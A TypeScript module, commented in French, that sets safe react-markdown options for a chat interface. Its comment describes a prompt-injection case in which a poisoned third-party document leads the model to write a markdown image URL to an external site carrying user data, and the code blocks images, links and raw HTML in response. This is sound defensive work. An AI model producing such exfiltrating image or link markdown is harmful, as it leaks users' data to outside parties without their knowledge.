import type { Options } from "react-markdown";

/**
 * Options de rendu des réponses du modèle dans le chat.
 *
 * Le modèle lit les documents du dossier, dont certains viennent de tiers. Un
 * document piégé peut lui faire écrire `![](https://site-externe/?d=<données>)` :
 * rendue en image, cette ligne ferait charger l'URL par le navigateur et
 * enverrait les données dans la requête, sans aucun clic. Un lien fait la même
 * chose au premier clic.
 *
 * Images et liens ne sont donc jamais rendus : leur texte reste affiché, sans
 * adresse. Le HTML brut est retiré (`skipHtml`) ; react-markdown ne
 * l'interprète de toute façon pas sans rehype-raw.
 */
export const SAFE_MARKDOWN_OPTIONS = {
  disallowedElements: ["img", "a"],
  unwrapDisallowed: true,
  skipHtml: true,
} satisfies Options;
